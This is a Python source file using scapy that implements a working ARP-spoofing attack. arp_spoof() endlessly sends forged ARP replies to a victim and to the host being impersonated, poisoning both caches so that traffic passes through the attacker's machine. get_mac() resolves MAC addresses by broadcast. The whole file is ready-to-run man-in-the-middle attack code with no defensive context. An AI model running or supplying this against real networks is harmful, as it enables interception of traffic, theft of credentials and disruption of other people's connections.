from scapy.all import Ether, ARP, sendp, srp, conf
import time

# prevent sendp, srp from spamming stdout
conf.verb = 0

def arp_spoof(mac_attacker, mac_victim, ip_to_spoof, ip_victim, interface):
    try:
        print("Started ARP spoofing")

        while(True):
            arp = Ether() / ARP()
            # arp[Ether].src = mac_attacker
            # arp[Ether].dst = mac_victim
            arp[ARP].hwsrc = mac_attacker
            arp[ARP].psrc = ip_to_spoof
            arp[ARP].hwdst = mac_victim
            arp[ARP].pdst = ip_victim

            # arp.show()

            sendp(arp, iface=interface)

            arp = Ether() / ARP()
            # arp[Ether].src = mac_attacker
            # arp[Ether].dst = mac_victim
            arp[ARP].hwsrc = mac_attacker
            arp[ARP].psrc = ip_victim
            arp[ARP].hwdst = get_mac(ip_to_spoof, interface)
            arp[ARP].pdst = ip_to_spoof

            # arp.show()

            sendp(arp, iface=interface)

            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopped ARP spoofing")

def get_mac(ip, interface):
    pakket = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip)
    # pakket.show()
    answer, unanswered = srp(pakket, iface=interface, timeout=1)

    if answer:
        sent, received = answer[0]
        return received.src
    else:
        print('MAC address of ip {ip} not found.'.format(ip=ip))
